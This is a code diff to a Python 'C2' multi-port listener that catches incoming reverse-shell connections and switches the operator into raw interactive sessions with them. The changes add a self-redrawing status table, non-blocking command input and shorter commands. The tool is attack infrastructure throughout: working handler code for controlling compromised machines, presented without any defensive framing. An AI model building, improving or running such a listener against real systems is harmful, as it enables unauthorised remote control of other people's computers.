@@ -13,52 +13,46 @@ connections = {} # port -> client_socket
 status = {p: "Waiting..." for p in PORTS}
 active_interaction = None
 
+# Global flag for UI update
+ui_dirty = True
+
 def listen_port(port):
-    global active_interaction
+    global active_interaction, ui_dirty
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
     try:
         s.bind((HOST, port))
         s.listen(1)
-        # update_status(port, "Listening")
         
         while True:
             conn, addr = s.accept()
             connections[port] = conn
             status[port] = f"Connected ({addr[0]})"
-            
-            # Keep alive loop or just hold connection
-            # If we are not interacting, we just let it sit?
-            # Reverse shells typically hang until input.
+            ui_dirty = True  # Trigger redraw
             
             while True:
-                # Check if connection is dead
                 try:
                     if port not in connections:
                          break
-
-                    # Non-blocking check?
                     if active_interaction != port:
                         time.sleep(0.5)
                         continue
-                        
-                    # If this port is active, logic is handled by 'interact' function
-                    # We just wait here until it's released or closed
                 except:
                     break
             
-            # If loop breaks, cleanup
             try: connections[port].close()
             except: pass
             connections.pop(port, None)
             status[port] = "Waiting..."
+            ui_dirty = True # Trigger redraw
             
     except Exception as e:
         status[port] = f"Error: {e}"
+        ui_dirty = True
 
 def interact(port):
-    global active_interaction
+    global active_interaction, ui_dirty
     if port not in connections:
         print(f"[-] No connection on port {port}")
         return
@@ -69,12 +63,12 @@ def interact(port):
         if p != port:
             print(f"[*] Auto-killing unused connection on Port {p}...")
             try:
-                # Closing and removing will trigger the thread loop to break
                 c = connections[p]
                 del connections[p] 
                 c.close()
             except:
                 pass
+    ui_dirty = True
 
     conn = connections[port]
     print(f"[*] Switching to Interactive Mode on Port {port}...")
@@ -86,7 +80,6 @@ def interact(port):
     import termios
     import tty
     
-    # Save original tty settings
     old_tty = termios.tcgetattr(sys.stdin)
     
     try:
@@ -99,7 +92,6 @@ def interact(port):
                 try:
                     data = conn.recv(4096)
                     if not data: break
-                    # Fix stair-stepping in raw mode: Replace \n with \r\n
                     decoded = data.decode(errors='ignore')
                     sys.stdout.write(decoded.replace('\n', '\r\n'))
                     sys.stdout.flush()
@@ -108,10 +100,8 @@ def interact(port):
             
             if sys.stdin in r:
                 chunk = sys.stdin.read(1)
-                # Check for Detach (Ctrl+C = \x03)
-                if chunk == '\x03':
+                if chunk == '\x03': # Ctrl+C
                     break
-                
                 conn.send(chunk.encode())
                 
     except Exception as e:
@@ -120,9 +110,12 @@ def interact(port):
         termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
         active_interaction = None
         print(f"\n[*] Detached from Port {port}.")
+        ui_dirty = True
 
 def print_status():
-    print("\n" + "="*40)
+    # ANSI Clear Screen
+    print("\033[H\033[J", end="") 
+    print("="*40)
     print(f"{'Port':<8} | {'Method':<20} | {'Status'}")
     print("-" * 40)
     methods = [
@@ -132,14 +125,16 @@ def print_status():
     ]
     for i, p in enumerate(PORTS):
         m = methods[i] if i < len(methods) else "Unknown"
-        s = status.get(p, "Unknown")
+        s = status.get(p, "Waiting...")
         print(f"{p:<8} | {m:<20} | {s}")
     print("="*40)
+    print("Commands: i <port> | kill <port> | quit")
+    print("C2> ", end="", flush=True)
 
 def main():
+    global ui_dirty
     print("[*] Starting Multi-Port Listener...")
     
-    # Start threads
     threads = []
     for p in PORTS:
         t = threading.Thread(target=listen_port, args=(p,))
@@ -147,42 +142,76 @@ def main():
         t.start()
         threads.append(t)
         
-    time.sleep(1) # Let sockets bind
+    time.sleep(1) 
     
-    # Command Loop
+    # Non-blocking Input Loop
+    cmd_buffer = ""
+    
     while True:
         try:
-            print_status()
-            print("\nCommands: interact <port> | kill <port> | quit")
-            cmd = input("C2> ").strip().split()
+            # Redraw if status changed
+            if ui_dirty:
+                print_status()
+                # Restore partial command if user was typing
+                sys.stdout.write(cmd_buffer)
+                sys.stdout.flush()
+                ui_dirty = False
             
-            if not cmd: continue
+            # Wait for input with timeout (to allow checking UI updates)
+            r, _, _ = select.select([sys.stdin], [], [], 0.5)
             
-            if cmd[0] == 'quit':
-                break
-            
-            if cmd[0] == 'interact':
-                if len(cmd) < 2: continue
-                try:
-                    p = int(cmd[1])
-                    interact(p)
-                except ValueError:
-                     print("Invalid port")
-            
-            if cmd[0] == 'kill':
-                if len(cmd) < 2: continue
-                try:
-                    p = int(cmd[1])
-                    if p in connections:
-                        connections[p].close()
-                        del connections[p]
-                        print(f"[*] Killed connection on {p}")
-                except: pass
-                
+            if sys.stdin in r:
+                char = sys.stdin.read(1)
+                if char == '\n':
+                    # Process command
+                    cmd_line = cmd_buffer.strip()
+                    cmd_buffer = ""
+                    print() # Newline after enter
+                    
+                    cmd = cmd_line.split()
+                    if not cmd: 
+                         ui_dirty = True # Force redraw prompt
+                         continue
+                         
+                    if cmd[0] == 'quit':
+                        break
+                    
+                    if cmd[0] == 'i':
+                        if len(cmd) < 2: 
+                            ui_dirty = True
+                            continue
+                        try:
+                            p = int(cmd[1])
+                            interact(p)
+                        except ValueError:
+                            print("Invalid port")
+                            time.sleep(1)
+                            ui_dirty = True
+                    
+                    if cmd[0] == 'kill':
+                        if len(cmd) < 2: 
+                             ui_dirty = True
+                             continue
+                        try:
+                            p = int(cmd[1])
+                            if p in connections:
+                                connections[p].close()
+                                del connections[p]
+                                print(f"[*] Killed connection on {p}")
+                                time.sleep(0.5)
+                                ui_dirty = True
+                        except: pass
+                        ui_dirty = True
+                else:
+                    # Echo char back
+                    cmd_buffer += char
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+
         except KeyboardInterrupt:
             break
             
-    print("[*] Exiting.")
+    print("\n[*] Exiting.")
 
 if __name__ == "__main__":
     main()
